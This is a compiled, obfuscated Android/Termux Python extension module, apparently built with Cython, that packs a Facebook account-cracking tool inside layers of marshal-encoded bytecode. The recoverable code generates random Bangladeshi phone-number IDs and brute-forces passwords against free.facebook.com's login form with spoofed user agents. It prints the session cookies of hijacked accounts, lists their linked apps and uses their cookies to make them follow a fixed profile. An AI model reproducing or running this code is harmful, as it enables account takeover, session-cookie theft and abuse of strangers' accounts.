ELF�@�^@8
@ @@@00������������P�P�P���ؤ��������������R�tdP�P�P���P�tdD�D�D�||Q�tdppp���Androidr25b8937393Tew�������2IUhv�������)Rcz������#0?Nhy��������+AOan~������/x�;`�@x�G
�7x�c
E��	E�qX��|BE�������K�JJ6?>,C<=&!"$9;AI:0*-
2G
D1'#.4F3E %+)5(7/8	@BH__cxa_finalize__cxa_atexit__register_atfork__bss_start_end_edataPyInit_greenPyModuleDef_InitPyThreadState_GetPyInterpreterState_GetIDPyExc_ImportErrorPyErr_SetStringPyObject_GetAttrStringPyModule_NewObject_Py_DeallocPyModule_GetDictPyDict_SetItemString_Py_NoneStructPyExc_AttributeErrorPyErr_ExceptionMatchesPyErr_ClearPyExc_RuntimeErrorPy_GetVersionPyOS_snprintfPyErr_WarnExPyTuple_NewPyBytes_FromStringAndSizePyUnicode_FromStringAndSizePyImport_AddModulePyObject_SetAttrStringPyUnicode_InternFromStringPyUnicode_DecodePyObject_Hash__pyx_module_is_main_greenPyObject_SetAttrPyImport_GetModuleDictPyDict_GetItemStringPyTuple_PackPyList_NewPyDict_NewPyImport_ImportModuleLevelObject_PyThreadState_UncheckedGet_PyObject_GetDictPtr_Py_FalseStruct_Py_TrueStructPyObject_NotPyErr_OccurredPyDict_SetItem_PyDict_GetItem_KnownHashPyObject_GetAttrPyUnicode_FromFormatPyUnicode_AsUTF8PyCode_NewEmptyPyFrame_NewPyTraceBack_HerePyMem_ReallocPyMem_Malloc__stack_chk_failPyExc_NameErrorPyErr_FormatPy_EnterRecursiveCallPy_LeaveRecursiveCallPyObject_CallPyExc_SystemErrorPyObject_DirPyDict_ContainsPyExc_TypeErrorPyEval_GetBuiltinsPyCode_TypePyUnicode_AsUTF8StringPyEval_MergeCompilerFlagsPyRun_StringFlagsPyEval_EvalCodelibc.soLIBC/data/data/com.termux/files/usr/lib:/data/data/com.termux/files/usr/lib:/data/data/com.termux/files/usr/lib:/data/data/com.termux/files/usr/liblibandroid-support.solibpython3.10.so.1.0P�P�X�0�`����8�����������п�ؿ������� ��(��H���P��p�@�x����(���9���Ԕ�����]��� �@�H�(�X�P�����������'��(��6��;��>��@��I��� �(�0�8�@�	H�
P�X�`�
h�p�x��������������������������� ��!��"��#�$�%�&�) �*(�+0�,8�-@�.H�/P�0X�1`�2h�3p�4x�5��7��8��9��:��<��=��?��A��B��C��D
origingreen.pyexec: arg 1 must be string, bytes or code object, got %.200scompiletime version %s of module '%.100s' does not match runtime version %sbuiltinsname__path__init greenname '%U' is not definedloader%d.%d while calling a Python objectexec() arg 2 must be a dict, not %.200ssubmodule_search_locationsModule 'green' has already been imported. Re-initialisation is not supported.__package____file__Interpreter change detected - this module can only be loaded into one interpreter per process.NULL result without error in PyObject_Call%s (%s:%d)parentcython_runtime__loader__/sdcard/green.cgreencode object passed to exec() may not contain free variables__builtins__cline_in_traceback__import__loads__main__marshal__name__�@sddlZee�d��dS)�Ns�a�@sddlZee�d��dS)�Ns:a�@sddlZee�d��dS)�Ns�`�@sddlZee�d��dS)�Ns&`�@sddlZee�d��dS)�Ns�_�@sddlZee�d��dS)�Ns_�@sddlZee�d��dS)�Ns�^�@sddlZee�d��dS)�Ns�]�@sddlZee�d��dS)�Nst]�@sddlZee�d��dS)�Ns�\�@sddlZee�d��dS)�Ns`\�@sddlZee�d��dS)�Ns�[�@sddlZee�d��dS)�NsL[�@sddlZee�d��dS)�Ns�Z�@sddlZee�d��dS)�Ns8Z�@sddlZee�d��dS)�Ns�Y�@sddlZee�d��dS)�Ns$Y�@sddlZee�d��dS)�Ns�X�@sddlZee�d��dS)�NsX�@sddlZee�d��dS)�Ns�W�@sddlZee�d��dS)�Ns�V�@sddlZee�d��dS)�NsrV�@sddlZee�d��dS)�Ns�U�@sddlZee�d��dS)�Ns^U�@sddlZee�d��dS)�Ns�T�@sddlZee�d��dS)�NsJT�@sddlZee�d��dS)�Ns�S�@sddlZee�d��dS)�Ns6S�@sddlZee�d��dS)�Ns�R�@sddlZee�d��dS)�Ns"R�@sddlZee�d��dS)�Ns�Q�@sddlZee�d��dS)�NsQ�@sddlZee�d��dS)�Ns�P�@sddlZee�d��dS)�Ns�O�@sddlZee�d��dS)�NspO�@sddlZee�d��dS)�Ns�N�@sddlZee�d��dS)�Ns\N�@sddlZee�d��dS)�Ns�M�@sddlZee�d��dS)�NsHM�@sddlZee�d��dS)�Ns�L�@sddlZee�d��dS)�Ns4L�@sddlZee�d��dS)�Ns�K�@sddlZee�d��dS)�Ns K�@sddlZee�d��dS)�Ns�J�@sddlZee�d��dS)�NsJ�@sddlZee�d��dS)�Ns�I�@sddlZee�d��dS)�Ns�H�@sddlZee�d��dS)�NsnH�@sddlZee�d��dS)�Ns�G�@sddlZee�d��dS)�NsZG�@sddlZee�d��dS)�Ns�F�@sddlZee�d��dS)�NsFF�@sddlZee�d��dS)�Ns�E�@sddlZee�d��dS)�Ns2E�@sddlZee�d��dS)�Ns�D�@sddlZee�d��dS)�NsD�@sddlZee�d��dS)�Ns�C�@sddlZee�d��dS)�Ns
C�@sddlZee�d��dS)�Ns�B�@sddlZee�d��dS)�Ns�A�@sddlZee�d��dS)�NslA�@sddlZee�d��dS)�Ns�@�@sddlZee�d��dS)�NsX@�@sddlZee�d��dS)�Ns�?�@sddlZee�d��dS)�NsD?�@sddlZee�d��dS)�Ns�>�@sddlZee�d��dS)�Ns0>�@sddlZee�d��dS)�Ns�=�@sddlZee�d��dS)�Ns=�@sddlZee�d��dS)�Ns�<�@sddlZee�d��dS)�Ns<�@sddlZee�d��dS)�Ns~;�@sddlZee�d��dS)�Ns�:�@sddlZee�d��dS)�Nsj:�@sddlZee�d��dS)�Ns�9�@sddlZee�d��dS)�NsV9�@sddlZee�d��dS)�Ns�8�@sddlZee�d��dS)�NsB8�@sddlZee�d��dS)�Ns�7�@sddlZee�d��dS)�Ns.7�@sddlZee�d��dS)�Ns�6�@sddlZee�d��dS)�Ns6�@sddlZee�d��dS)�Ns�5�@sddlZee�d��dS)�Ns5�@sddlZee�d��dS)�Ns|4�@sddlZee�d��dS)�Ns�3�@sddlZee�d��dS)�Nsh3�@sddlZee�d��dS)�Ns�2�@sddlZee�d��dS)�NsT2�@sddlZee�d��dS)�Ns�1�@sddlZee�d��dS)�Ns@1�@sddlZee�d��dS)�Ns�0�@sddlZee�d��dS)�Ns,0�@sddlZee�d��dS)�Ns�/�@sddlZee�d��dS)�Ns/�@sddlZee�d��dS)�Ns�.�@sddlZee�d��dS)�Ns.�@sddlZee�d��dS)�Nsz-�@sddlZee�d��dS)�Ns�,�@sddlZee�d��dS)�Nsf,�@sddlZee�d��dS)�Ns�+�@s�dZdZdZdZdZdZdZdZdd	lZdd	l	Z	dd	l
Z
dd	lZdd	lZdd
lm
Ze�
d�e�
d�Gd
d�d�Zd�gd�e��d�e��d�e��d�e��d�e��d�e��d�e��d�e��d�e��d�e��d�e��d�e��d�e��d�e��d�e��d�e��d�e��d�e��d�e��d�e��d�e��d��Zdd�Zdd	lZdd	l	Z	dd	l
Z
dd	lZdd	lZdd	lZdd	lZdd	lZdd	lZdd	lZe�
d�ddlmZddlmZdd	lZddlmZddlmZddl
mZddl
mZ zdd	lZdd l!m"Z#dd	l$Z$dd!l%m&Z&Wne'�y.e�
d"�e�
d#�Ynwd$d%�Z(d&d'�Z)Gd(d�d�ZdZ*dZ+d)Z,d*Z-d+Z.d,Z/dZdZ0dZ1dZ2dZdZ3dZ4d-Z5dZd.Z6d/Z7d0Z8d1Z9d2Z:d3Z;d4Z<d5Z=ee0e1e2ee3e4e5gZ>e�?e>�Z@e�A�ZAeA�Bd6�ZCe�A�ZDeDjEZFeDjGZHeDjIZJe�K�ZKdaLgaMgaNd7d8�ZOdd9l
mPZQdd
lm
ZReSeQ�d:�ZTeTd;k�r�eTd;ZUd<ZVneTZUd=ZVzeWd>�d?ZXd@ZYd@ZYeZeX�eYv�r�e�
d8�n	WneWdA�YdBdC�Z[gZ\gZ]e^dD�D]eZ_dEZ`e�?gdF��ZadGZbe�?gdH��Zce�ddIdJ�Zee�?gdH��ZfdKZge�ddLdM�ZhdNZie�ddOdP�Zje�ddQdR�ZkdSZle`�dTea�dUeb�ec�ee�ef�dVeg�eh�dWei�dWej�dWek�dTel��Zme]�nem�e\�nem��q�dXdY�ZidZd[�Zod\d]�Zpeqd^k�rme�d	Sd	S)_�[1;97mz[1;91m�[1;92m�[1;93m�[1;94mz[1;95m�[1;96mz[1;90m�N)�systemzgit pullzpkg install curlc@�eZdZdd�ZdS)�sifatcCsdS�N�)�self�zrr�<alvino>�__init__s�sifat.__init__N��__name__�
__module__�__qualname__rrrrrr	�r	�a�
[1;97m888b     d888 8888888b.         .d8888b.  8888888b.  8888888888 8888888888 888b    888 
[1;92m8888b   d8888 888   Y88b       d88P  Y88b 888   Y88b 888        888        8888b   888 
[1;97m88888b.d88888 888    888       888    888 888    888 888        888        88888b  888 
[1;92m888Y88888P888 888   d88P       888        888   d88P 8888888    8888888    888Y88b 888 
[1;97m888 Y888P 888 8888888P"        888  88888 8888888P"  888        888        888 Y88b888 
[1;92m888  Y8P  888 888 T88b  888888 888    888 888 T88b   888        888        888  Y88888 
[1;97m888   "   888 888  T88b        Y88b  d88P 888  T88b  888        888        888   Y8888 
[1;92m888       888 888   T88b        "Y8888P88 888   T88b 8888888888 8888888888 888    Y888
 
�[�+zV]------------------------------------------------------------------------------------
z] CREATED BY   :  ARIYAN ISLAM
z] ON FACEBOK   :  ARIYAN ISLAM NIL
z] ON GITHUB    :  ariyan-king
z] TOOL STATUS  :  RANDOM 
z] TOOL VIRSION :  1.0.1
zV]-------------------------------------------------------------------------------------c
Cs�t�d�tt�td�tt�dt�dt�dt�d��tt�dt�dt�dt�d��tt�dt�d	t�dt�d
��tdt�dt�d
t�dt�d�	�}|dkrVt�n|dkr]t	�dd	krht�d�dSdS)N�clearr� [�1�] zCRACK RANDOM UID�2zCRACK FROM FILE�0ZEXITz
 rrz	Choose : �exit)
�osrr	�logo�print�W�G�input�i�
crack_file)Zoptrrr�o-s
   "
�r()�
BeautifulSoup)�date)�datetime)�sleep)�ThreadPoolExecutor)�ConnectionErrorz9pip install mechanize requests futures bs4==2 > /dev/nullzpip install bs4c	Csf|jdd|id�j}t|d�}|jddd�}dd	�|�d
�D�}t|�dkr2tdtttttf�n$td
t	��t
�tt|��D]}tdt|d||�dd�tf�qA|jdd|id�j}t|d�}|jddd�}dd	�|�d
�D�}t|�dkr�tdtttttf�dStdt	��t�tt|��D]}tdt|d||�dd�tf�q�td�dS)Nz:https://free.facebook.com/settings/apps/tabbed/?tab=active�cookie��cookies�html.parserZform�post)�methodcS�g|]}|j�qSr��text��.0r&rrr�
<listcomp>T�zcek_apk.<locals>.<listcomp>Zh3rz7
%s[%s!%s] %s [1;94m Sorry there is no Active  Apk%s  u1
[🎮] %s [1;95m ☆ Your Active Apps ☆     :z
[%s%s] %s%s�zDitambahkan padaz Ditambahkan padaz<https://free.facebook.com/settings/apps/tabbed/?tab=inactivecSr5rr6r8rrrr:`r;zA
%s[%s!%s] %s [1;97m Sorry there is no Expired Apk%s           
u1
[🎮] %s [1;92m ◇ Your Expired Apps ◇    :ZKedaluwarsaz Kedaluwarsar)
�getr7r)�findZfind_all�lenr"�N�M�WHITE�GREEN�range�replace)�session�coki�w�sop�xZgamer&rrr�cek_apkPs&
&
&rKcCs\t|jdd|ifid��jd�}|jd
id���d�}|jd	t|�d|ifid��jdS)Nz8https://free.facebook.com/profile.php?id=100015315258519r/r0r2�a�Ikuti)�stringZhref�https://free.facebook.com)rLrM)r)r=r7r>�str)rrFrG�rr=rrr�followjs�����rRc@r)r	cCs(|dD]
}tj�|�tj��qdS)N�
)�sys�stdout�write�flush)rr
�errrrts�rNrrrrrr	srz[1;32mz[1;33mz[1;34mz[1;35mz[0mz[1;107mz[1;106mz[1;105mz[1;104mz[1;103mz[1;102mz[1;101mz[1;100mz%H:%McCst�d�tt�dS)Nr)r rr"r!rrrrr�s
r)�	localtime��ZPMZAMz(
 
[1;33mLoading asset files ... [0;97mg������@z5.2z*
[1;31mNo internet connection ... [0;97mcCs<gd�}|D]}td||�ftj��t�d�qdS)N)z.   z..  z... z.... �
r<)r"rTrUrW�timer,)r7Ztitikr(rrr�dynamic�s
�r^i��zMozilla/5.0 (Linux; U; Android)�3�4�5�6�7�8�9Z10Z11Z12Z13Z14Z15Z16Z17z en-us; GT-)�A�B�C�D�E�Fr$�H�I�J�K�LrAr@�O�P�Q�R�S�T�U�Vr#�X�Y�Zr<i�z.AppleWebKit/537.36 (KHTML, like Gecko) Chrome/�I�drihi$�(�zMobile Safari/537.36� z; z) �.cCs g}g}tjtjt�d�tt�td�tt�dt�dt�dt�dt	�dt�d��t
d	t�dt�dt�d
t�d�	�}td�tt
t�dt�dt�dt�dt�d
t�dt	�dt�d
t
�d���}t|�D]}d�dd�td�D��}|�|�qgt�d�tt�td�tt|��}tt
t�dt�dt�d
t�dt�d�
��}g}td�t|�D]}	t
t�dt�dt�d
t�dt�d�
�}
|�|
�q�tdd��8}t�|D])}|dd�g}
||}|D]}|
�|�|
�d�|
�d�q�|�t||
|�q�Wd�dS1�s	wYdS)Nrrrr�]z BANGLADESHz  : z88016, 88017 ,88018 ,88019rSrzPUT CODE : z ENTER YOU LIMIT EXAMPLE : z2000, 3000, 50000, 100000
 
zPUT CLONING LIMIT : css�|]	}t�tj�VqdSr
)�random�choicerNZdigits)r9�_rrr�	<genexpr>�s�zi.<locals>.<genexpr>�zEnter Password Limit :r�zEnter Password :�2)Zmax_workersr<Z
bangladeshZ123890)r �getuid�geteuidrr	r!r"r#r$rtr%�intrgrzrD�join�appendrPr?�
ThreadPoolrZsubmit�rcrack)�userZtwf�codeZlimitZnmbrZnmp�tlZpassxZHamiiIDZbilalZpwwZmansheraZlove�pwx�uidZEmanrrrr&�sH
,"B
*&

�$�r&cCsb�z)|D]�}t�t�}t��}|�d�j}t�dt	|���
d�t�dt	|���
d�t�dt	|���
d�t�dt	|���
d�dd||dd	�	}id
d�dd
�dd�dd�dd�dd�dd�dd�dd�dd�dd�d d!�d"d#�d$d%�d&d'�d(d)�d*d+�d,d-|d.��}|jd/||d0�j}	|j�
���}
d1|
vr�d2�d3d4�|j�
���D��}|d5d6�}tt�d7|�d8|���tt�d9|���t||�t�|�n-d:|
vr�d2�d;d4�|j�
���D��}|d<d=�}tt�d>|�d8|���t�|�nqtd7agd?�}
t�|
�}tj�d@t�dAt�dBt�dC|�t�dD|�dEt�dFtt����tj��WdSYdS)GNrOzname="lsd" value="(.*?)"r<zname="jazoest" value="(.*?)"zname="m_ts" value="(.*?)"zname="li" value="(.*?)"rzLog In)	ZlsdZjazoestZm_tsZliZ
try_numberZunrecognized_triesZemailZpassZloginZ	authorityzfree.facebook.comr4ZGETZschemeZhttpsZacceptz�text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.8zaccept-encodingzgzip, deflate, brzaccept-languagezen-US,en;q=1z
cache-controlz#no-cache, no-store, must-revalidateZrefererzhttps://t.facebook.com/z	sec-ch-uaz>"Google Chrome";v="90", "Not)A;Brand";v="8", "Chromium";v="75"zsec-ch-ua-mobilez?1zsec-ch-ua-platformZWindowszsec-fetch-destZdocumentzsec-fetch-modeZnavigatezsec-fetch-sitezsame-originzsec-fetch-userz?0Zpragmazno-cacheZpriorityzu=0zcross-originr)zcross-origin-resource-policyzupgrade-insecure-requestsz
user-agentzBhttps://free.facebook.com/login/device-based/regular/login/?refsrc)�dataZheadersZc_user�;cS�g|]
\}}|d|�qS��=r�r9�key�valuerrrr:&�zrcrack.<locals>.<listcomp>r��z [ARI-YAN-OK] z | z [  COOKIE  ] Z
checkpointcSr�r�rr�rrrr:/r���'z [ARI-YAN-CP] )rrrrrr\z [ zCLONING r�|r�zOK : ) r�r��ugen�requestsZSessionr=r7�re�searchrP�groupr3r1Zget_dict�keysr��itemsr"r$r#rK�oksr�rt�cps�looprTrUrVrgr?rW)r�r�r�ZpsZprorFZfree_fbZlog_dataZ
header_freefbZloZlog_cookiesrGZcidZaccZrcrrrr��s�
�
��������	�
���
�����



>r�cCst�d�dS)Nzpython X-PRO.py)r rrrrrr'Csr'�__main__)rr#rtr$rzrgrrZnbrfr rTr]r�Zuuidr�sr	r�r!r(Zjsonr�r�rN�platform�base64Zbs4r)rIZressr+r*r,ZwaktuZconcurrent.futuresr-r�Z	mechanizeZrequests.exceptionsr.�ModuleNotFoundErrorrKrRZREDrBrCZYELLOWZBLUEZORANGErArlrorwrqr@ZBNZBBLZBPZBBZBKZBHZBMZBAZmy_colorr�ZwarnaZnow�strftimeZ	dt_stringZcurrentZyearZtaZmonthZbuZdayZhaZtodayr�r�r�rrYZlt�cmdr�ZltxrL�tagr"�v�updaterPr^Zugen2r�rDZxdZaa�b�c�dZ	randrangerX�f�g�hr&�j�k�lZuaku2r�r�r'rrrrr�<module>sD



�
�
�������
�
�
����������P

�	�


�B
'I

�)�marshal�exec�loads�rr�<alvino>�<module>s)�marshal�exec�loads�rr�<alvino>�<module>s)�marshal�exec�loads�rr�<alvino>�<module>s)�marshal�exec�loads�rr�<alvino>�<module>s)�marshal�exec�loads�rr�<alvino>�<module>s)�marshal�exec�loads�rr�<alvino>�<module>s)�marshal�exec�loads�rr�<alvino>�<module>s)�marshal�exec�loads�rr�<alvino>�<module>s)�marshal�exec�loads�rr�<alvino>�<module>s)�marshal�exec�loads�rr�<alvino>�<module>s)�marshal�exec�loads�rr�<alvino>�<module>s)�marshal�exec�loads�rr�<alvino>�<module>s)�marshal�exec�loads�rr�<alvino>�<module>s)�marshal�exec�loads�rr�<alvino>�<module>s)�marshal�exec�loads�rr�<alvino>�<module>s)�marshal�exec�loads�rr�<alvino>�<module>s)�marshal�exec�loads�rr�<alvino>�<module>s)�marshal�exec�loads�rr�<alvino>�<module>s)�marshal�exec�loads�rr�<alvino>�<module>s)�marshal�exec�loads�rr�<alvino>�<module>s)�marshal�exec�loads�rr�<alvino>�<module>s)�marshal�exec�loads�rr�<alvino>�<module>s)�marshal�exec�loads�rr�<alvino>�<module>s)�marshal�exec�loads�rr�<alvino>�<module>s)�marshal�exec�loads�rr�<alvino>�<module>s)�marshal�exec�loads�rr�<alvino>�<module>s)�marshal�exec�loads�rr�<alvino>�<module>s)�marshal�exec�loads�rr�<alvino>�<module>s)�marshal�exec�loads�rr�<alvino>�<module>s)�marshal�exec�loads�rr�<alvino>�<module>s)�marshal�exec�loads�rr�<alvino>�<module>s)�marshal�exec�loads�rr�<alvino>�<module>s)�marshal�exec�loads�rr�<alvino>�<module>s)�marshal�exec�loads�rr�<alvino>�<module>s)�marshal�exec�loads�rr�<alvino>�<module>s)�marshal�exec�loads�rr�<alvino>�<module>s)�marshal�exec�loads�rr�<alvino>�<module>s)�marshal�exec�loads�rr�<alvino>�<module>s)�marshal�exec�loads�rr�<alvino>�<module>s)�marshal�exec�loads�rr�<alvino>�<module>s)�marshal�exec�loads�rr�<alvino>�<module>s)�marshal�exec�loads�rr�<alvino>�<module>s)�marshal�exec�loads�rr�<alvino>�<module>s)�marshal�exec�loads�rr�<alvino>�<module>s)�marshal�exec�loads�rr�<alvino>�<module>s)�marshal�exec�loads�rr�<alvino>�<module>s)�marshal�exec�loads�rr�<alvino>�<module>s)�marshal�exec�loads�rr�<alvino>�<module>s)�marshal�exec�loads�rr�<alvino>�<module>s)�marshal�exec�loads�rr�<alvino>�<module>s)�marshal�exec�loads�rr�<alvino>�<module>s)�marshal�exec�loads�rr�<alvino>�<module>s)�marshal�exec�loads�rr�<alvino>�<module>s)�marshal�exec�loads�rr�<alvino>�<module>s)�marshal�exec�loads�rr�<alvino>�<module>s)�marshal�exec�loads�rr�<alvino>�<module>s)�marshal�exec�loads�rr�<alvino>�<module>s)�marshal�exec�loads�rr�<alvino>�<module>s)�marshal�exec�loads�rr�<alvino>�<module>s)�marshal�exec�loads�rr�<alvino>�<module>s)�marshal�exec�loads�rr�<alvino>�<module>s)�marshal�exec�loads�rr�<alvino>�<module>s)�marshal�exec�loads�rr�<alvino>�<module>s)�marshal�exec�loads�rr�<alvino>�<module>s)�marshal�exec�loads�rr�<alvino>�<module>s)�marshal�exec�loads�rr�<alvino>�<module>s)�marshal�exec�loads�rr�<alvino>�<module>s)�marshal�exec�loads�rr�<alvino>�<module>s)�marshal�exec�loads�rr�<alvino>�<module>s)�marshal�exec�loads�rr�<alvino>�<module>s)�marshal�exec�loads�rr�<alvino>�<module>s)�marshal�exec�loads�rr�<alvino>�<module>s)�marshal�exec�loads�rr�<alvino>�<module>s)�marshal�exec�loads�rr�<alvino>�<module>s)�marshal�exec�loads�rr�<alvino>�<module>s)�marshal�exec�loads�rr�<alvino>�<module>s)�marshal�exec�loads�rr�<alvino>�<module>s)�marshal�exec�loads�rr�<alvino>�<module>s)�marshal�exec�loads�rr�<alvino>�<module>s)�marshal�exec�loads�rr�<alvino>�<module>s)�marshal�exec�loads�rr�<alvino>�<module>s)�marshal�exec�loads�rr�<alvino>�<module>s)�marshal�exec�loads�rr�<alvino>�<module>s)�marshal�exec�loads�rr�<alvino>�<module>s)�marshal�exec�loads�rr�<alvino>�<module>s)�marshal�exec�loads�rr�<alvino>�<module>s)�marshal�exec�loads�rr�<alvino>�<module>s)�marshal�exec�loads�rr�<alvino>�<module>s)�marshal�exec�loads�rr�<alvino>�<module>s)�marshal�exec�loads�rr�<alvino>�<module>s)�marshal�exec�loads�rr�<alvino>�<module>s)�marshal�exec�loads�rr�<alvino>�<module>s)�marshal�exec�loads�rr�<alvino>�<module>s)�marshal�exec�loads�rr�<alvino>�<module>s)�marshal�exec�loads�rr�<alvino>�<module>s)�marshal�exec�loads�rr�<alvino>�<module>s)�marshal�exec�loads�rr�<alvino>�<module>s)�marshal�exec�loads�rr�<alvino>�<module>s)�marshal�exec�loads�rr�<alvino>�<module>s)�marshal�exec�loads�rr�<alvino>�<module>s)�marshal�exec�loads�rr�<alvino>�<module>s__test__;xx�����������$�<�%��%,&t�&�4($zR|�4�L�d�|�����\��(D@P@�������
@P�������D
�@P�������D`@P�������L$hD�\`�����
�������
`
�\������������D<t#�D H ����
p H����Dl H����D�\#xD H ����
x H����D
L H����DD H����\��#�D0L0����
�
D0L�����D
L0L�����D
P0L�����D`0L�����L\�#\D@P@�����
���
@P��������DL@P��������L�%D@P0�����
�
`@P������D
p@P������D_$� �`T�_$��_�_$����_$�`�����_�_$�����p�B@=��_$� ��Q� �����{�����W��O�������@���(�	�B�?�@T?�`T�����!\6�MA�@�������`T(��B���h@��h�k����!H2������������@�����aT������������������!3����� �������!9��������@��*���aT�����7����!�/���u� 
�������!86�����~��@��*���aT��o���7����!�8���b� 	�������!6�����k��@��*���aT��\�W
�7����!d4���O� ����QA��T����!\2�����T��*�@���TU�6<�*�@���A��T��>���7���OC��WB��@��{Ĩ�_��UA�@�?� 4A�����!�/���%� ����UA�@�4��46�����!�8���� ����UA�@�)�`4+�����!d4���� ����UA�@��4 ����OC��WB��@��{Ĩ�_�h@��h�aT��������OC��WB��@��{Ĩ�_��C��{��o��g��_��W��O����[�;�:�h@�����H�B�h��T�����!�4�YA�@����D��������B03��C���Rc�RD�R���C@97��4i@9?k�T�G@9h4i@9?k!T�K@94i
@9?k�T�O@9�4i@9?k�TX�*#��(�RH�Rh�Rhjh8�Q)qb	T�39��h@9�qaT��R�#9j@9_�q@T)�RK�Q)1�T-	�Q?)1CT�#9j@9_�qT��R�'9j
@9_�q T)�R�*K�Q)1cT�'9j
@9_�q!T�q�T��R�+9h@9�qTH�Q)1�T�+9h@9�q�T�5��R	�Q?)1CT�/9����B�0� � �0�c��C��#��R���c���"�R3�R�� �7����(����*������2�����(���`*������2�����(����)�3�s����t��@����W�`�)�@�������$2�w�(���@(�@��������8�n�����'�@� Ձ�p��`@�b@�h���7Д�=��"@9�&@9(*h4�*@9H4�_�a���^����^�@���T�"��H���^����^�@���K����_��"���P���^����^�@��?9���^����^�@� �G���T�
@����H����]A�@��4a�C�`@�?�`�7A� $� �!�0��@���B�B� �a�0���� #�74���� �R3�R�@�7����	�9���4C�5�����@�B���	���2��������������*.���@3�RuR3�R5R5��R@�B���(��B��C�#���B����%��bF����~��.@��.������@�(�	@�%C�?��T(�)C����aA����T�eA���T��
�5��@@������!�2�MA�@�����ĀR���3�RÀR���������h@��h�aT�������@���aT�����8�c���@�@����
�7�@���aT��z�@�	@�
@�?�T(�	C����@�����@�)���I@�!
C���?������@���aT��`�(���C���@����`���h���T�J� ����������@������T�@����T3�h@��h�aT��>�������@�+@������@����`�7�1������R5ǀRa��uǀR��R�@�����A��T��#��@���a��T���3�����RʀRM��3�RuˀRH������G��3�R���RD��3�Rռ�RA��3�R���R>��3�Ru��R;��3�R���R8��3�R���R5��	�)�� @�!)@�@�I@���?�������Y��	�qaA�)eA��@�6��H���!��T����6������@�"@�S������@�
@���`���%3�R�ÀR
��3�R�ÀR
�� C�y�	F���`����ȀR��R��� C�P���`�����RuȀR�����RɀR�������uɀR��R���3�R5ˀR���/���`���������@�)@�B`A����*��E�����6@��6���@���AT�����@����aT�������@����aT�����q�|�Z	�\4-C��)�E�+q�T
Q+�J	@�_k�T�ZF��~��.@��.�4�����8�����!�2�����B49��*�� �������������/��*��(@����(�!	T��m�F�4�*!��*�
k
Tj
K_qJ����N}|��
*�in��k���T
TM�*���	@��*�kJ��_	k*��T	�*�)	@�?k���TI}@�)�|�ii��@������������B�����������f����@���aT��6�V��@�����T��/�������/�����!�2��*����u
���E�����6@��6���@���AT���H@��H�aT�����(@��(�aT�������4-C����E�	qDT
P)��*J	@�_k�T�4�*
 ��
*�k
T,K�q���v��~|��*Lil��k���T
T��	*���@��*�k֦��k�T	�6�)	@�?k�T	�)�E�	kAT�~|�h�����	�)��(@� Y�7	�k�T
}@��~@��(�`�<lA�J�_	�`�=��L��T�~@�		�<	�5���x��(@��(�aT������@���aT��������@����aT�������@�B���_��@���AT��H�B����Zh@��_�	�!T�OT��WS��_R��gQ��oP��{O��C��_���R#�`������	�R*�RY�		�
���>���~@�	�|�hi�h)�	@�)�	�!��T��~�6����{���O���������B�	@���)I@�	� ?�������OA��{¨�_�����@���С���!�2���iA�@������OA��{¨�_��{���O������b���@��@����@�
@�����@����OA��{¨�_֯������OA��{¨������OA��{¨�_��{�����O���@�����A@�5�����H3����5�������?����������OB��@��{è�_��������OB��@��{è����������OB��@��{è�_�С���!�7�mA�@�������OB��@��{è�_��{���_��W��O������@�@�i@�)�i�����@����$T���T�@���yw����� ��5�@��B��B9� 6@�I@�h���?�����������K� ��6��O��������@����T�@����aT�����@���aT����h@����h����T���OC��WB��_A��{Ĩ�_��������OC��WB��_A��{Ĩ�_����{��W��O��C�V�;����@��������QA�?�Th@�	�B9�(7	С���!�3���B�����C�"@����C�C���������`�7	Ј@�)uA�	��T���� �E���	U@���7i�7	С���!0�)qA�
@� @�� �*@�	@��kTС���!�9�qA�@�e� �R���� �������������@4����! �R�������U����@��@�	�T���OC��WB��{A����_�����������5��! �R���������U����@������T��>�������������@��@�	��T�OC��WB��{A����_����{����A�� � � � ���A�"� ���A�B� ���A�b� ���A��� ���A��� ���A��� ���A��� ���A�
� ���A�"
� ���A�B
� ���A�b
� ���A��
� ���A��
� ���A��
� ���A��
� ���A�� ���A�"� ���A�B� ���A�b� ���A��� ���A��� ���A��� ���A��� ���A�� ���A�"� ���A�B� ���A�b� ���A��� ���A��� ���A��� ���A��� ��B�� ��B�"� ��
B�B� ��B�b� ��B��� ��B��� ��B��� ��B��� ��"B�� ��&B�"� ��*B�B� ��.B�b� ��2B��� ��6B��� ��:B��� ��>B��� ��BB�� ��FB�"� ��JB�B� ��NB�b� ��RB��� ��VB��� ��ZB��� ��^B��� ��bB�� ��fB�"� ��jB�B� �
		Ob	
�����ox	���oxp��8
 
����o�
�
�����o�	���o�
���o����������������������������������������������������������������������������������������������������������������������������Android (8490178, based on r450784d) clang version 14.0.6 (https://android.googlesource.com/toolchain/llvm-project 4c603efb0cca074e9238af8b4106c30add4418f6)clang version 15.0.1Linker: LLD 15.0.1$P$�d�4�P�L�d��P�$�0��4cL�c8\PdpP��P��e��e��P��eeL�e� dLxd� eLxe� �Lx���Q�� gLx���P� fLXP f$ldd�d$led�e$l�d��,4QltQ4X�Xlgt��4<P<lft�PXlfp�d��dp�e��ep�����x�Q��Q�����g�����P��f��P��f��d��d��ee��e�4�����Q��Q����e�4e����P�4d��P�d4d4dPdPdP��P���d��
�P��
$d�8�P�h���|
�|
�
e�
�
��
$��8�h�0���
0��
�
0��
$0��0� 80�h���|
�|
�
c�
�
��
$��8�h�0���	0��	0
c0
4
0�4
<
P<
h
fh
|
0��
�
c�
�
f�
$0��0� ,0�,8Ph�0���	0��	�	f�	�	0��	�	P�	
e
|
0��
�
e�
�
0��
$0���0���f�0�f ,P,80�h�0��	0�	@	d@	l	0��	�	0��	�	P�	
d
h
0�t
�
d�
�
f�
�
d�
�
0��
$0���0��0�d P ,d,80���@��chc�����������$�$,�,4�48�Pd�d����������������������4���\�\t�t�Y�������(YT��h���(�4DPDdc��0���e��0���P��f��0���d��0���P��c��������0��	0���d��c�	c�0�$�0�8�
0�Tep�0�� e 80��4e�0�$�0�8$0�$Tfpx0��40��d$�d8�d�d$�d8xd�4d08P8\g$0P��gX�fp�f��fp	�	X��X�	�	Q��Q�	
d�
�
d

e�
�
eHh�h�e�`
ex
�
ep�e 8e|
�
d�
�
f|
�
d�
�
f0DP8<P4DQ8<Q8<XH�g@Hgp�gh�ih�jh�hl�Pl�gt�f�
lx
�
l�
�x
�
��
�
Z�
�
Z�
�
��
�x
�
��
�
]�
�
��
lx
�
l�
Xx
�
